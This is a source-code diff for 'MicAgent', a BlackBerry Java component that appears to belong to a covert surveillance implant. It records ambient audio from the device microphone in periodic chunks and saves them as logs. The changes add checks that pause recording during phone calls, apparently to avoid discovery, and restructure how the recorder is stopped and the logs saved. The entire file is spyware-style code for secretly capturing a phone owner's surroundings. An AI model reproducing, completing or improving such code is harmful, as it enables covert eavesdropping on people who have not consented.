@@ -9,6 +9,8 @@
  * *************************************************/
 package blackberry.agent;
 
+import net.rim.blackberry.api.phone.Phone;
+import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
 import blackberry.Conf;
@@ -31,6 +33,8 @@ import blackberry.utils.Utils;
  */
 public final class MicAgent extends Agent implements PhoneCallObserver {
     private static final long MIC_PERIOD = 5000;
+    static final int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5,
+            5, 0, 0, 0, 0 };
 
     //#ifdef DEBUG
     static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);
@@ -83,6 +87,9 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
             suspended = false;
             startRecorder();
         }
+        //#ifdef DEBUG_TRACE
+        debug.trace("started");
+        //#endif
     }
 
     public void actualStop() {
@@ -94,8 +101,13 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
 
         synchronized (suspendedLock) {
             suspended = false;
-            stopRecorder(5);
+            saveRecorderLog();
+            stopRecorder();
         }
+        //#ifdef DEBUG_TRACE
+        debug.trace("stopped");
+        //#endif
+
     }
 
     void startRecorder() {
@@ -121,43 +133,15 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
         recorder.start();
     }
 
-    void stopRecorder(final int secs) {
+    void stopRecorder() {
         //#ifdef DEBUG_TRACE
         debug.trace("stopRecorder");
         //#endif
 
-        if (recorder != null) {                      
-            Runnable closure = new Runnable() {
-                public void run() {
-                    try {
-                        Thread.sleep(secs * 1000);
-                    } catch (InterruptedException e) {
-                        // TODO Auto-generated catch block
-                        e.printStackTrace();
-                    }
-                    try {
-                        if (recorder != null) {
-                            recorder.stop();
-                        }
-                    } catch (Exception ex) {
-
-                    }
-                }
-            };
-            
-            if(secs == 0){
-                recorder.stop();
-            }else{
-                //#ifdef DEBUG_TRACE
-                debug.trace("stopRecorder: waiting "+secs);
-                //#endif
-                closure.run();
-            }
+        if (recorder != null) {
+            recorder.stop();
         }
     }
-
-    static final int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5,
-            5, 0, 0, 0, 0 };
 
     /*
      * (non-Javadoc)
@@ -166,6 +150,25 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
     public void actualRun() {
         //#ifdef DBC
         Check.requires(recorder != null, "actualRun: recorder == null");
+        //#endif
+
+        synchronized (suspendedLock) {
+            PhoneCall phoneCall = Phone.getActiveCall();
+            if (phoneCall != null
+                    && phoneCall.getStatus() != PhoneCall.STATUS_DISCONNECTED) {
+                //#ifdef DEBUG_WARN
+                debug.warn("phone call in progress, suspend!");
+                //#endif                
+                suspend();
+            } else {
+                saveRecorderLog();
+            }
+        }
+    }
+
+    private synchronized void saveRecorderLog() {
+        //#ifdef DBC
+        Check.requires(recorder != null, "saveRecorderLog recorder==null");
         //#endif
 
         byte[] chunk = recorder.getAvailable();
@@ -229,6 +232,56 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
         return additionalData;
     }
 
+    public void onCallAnswered(int callId, String phoneNumber) {
+    }
+
+    public void onCallConnected(int callId, String phoneNumber) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("onCallConnected");
+        //#endif
+        suspend();
+    }
+
+    /**
+     * Suspend recording
+     */
+    private void suspend() {
+        synchronized (suspendedLock) {
+            if (!suspended) {
+                //#ifdef DEBUG_INFO
+                debug.info("Call: suspending recording");
+                //#endif
+                stopRecorder();
+                suspended = true;
+            } else {
+                //#ifdef DEBUG_TRACE
+                debug.trace("suspend: already done");
+                //#endif
+            }
+        }
+    }
+
+    public void onCallDisconnected(int callId, String phoneNumber) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("onCallDisconnected");
+        //#endif
+        suspend();
+    }
+
+    public void onCallIncoming(int callId, String phoneNumber) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("onCallIncoming");
+        //#endif
+        suspend();
+    }
+
+    public void onCallInitiated(int callId, String phoneNumber) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("onCallInitiated");
+        //#endif
+        suspend();
+    }
+
     /*
      * (non-Javadoc)
      * @see blackberry.agent.Agent#parse(byte[])
@@ -238,53 +291,4 @@ public final class MicAgent extends Agent implements PhoneCallObserver {
         setDelay(MIC_PERIOD);
         return true;
     }
-
-    public void onCallAnswered(int callId, String phoneNumber) {
-    }
-
-    public void onCallConnected(int callId, String phoneNumber) {
-        //#ifdef DEBUG_TRACE
-        debug.trace("onCallConnected");
-        //#endif
-        synchronized (suspendedLock) {
-            if (!suspended) {
-                //#ifdef DEBUG_INFO
-                debug.info("Call connected: suspending recording");
-                //#endif
-                stopRecorder(0);
-                suspended = true;
-            }
-        }
-    }
-
-    public void onCallDisconnected(int callId, String phoneNumber) {
-        //#ifdef DEBUG_TRACE
-        debug.trace("onCallDisconnected");
-        //#endif
-        synchronized (suspendedLock) {
-            if (suspended) {
-                //#ifdef DEBUG_INFO
-                debug.info("Call disconnected: resuming recording");
-                //#endif
-                suspended = false;
-                startRecorder();
-            }
-        }
-    }
-
-    public void onCallIncoming(int callId, String phoneNumber) {
-      //#ifdef DEBUG_TRACE
-        debug.trace("onCallIncoming");
-        //#endif
-        synchronized (suspendedLock) {
-            if (!suspended) {
-                //#ifdef DEBUG_INFO
-                debug.info("Call connected: suspending recording");
-                //#endif
-                stopRecorder(0);
-                suspended = true;
-            }
-        }
-    }
-
 }
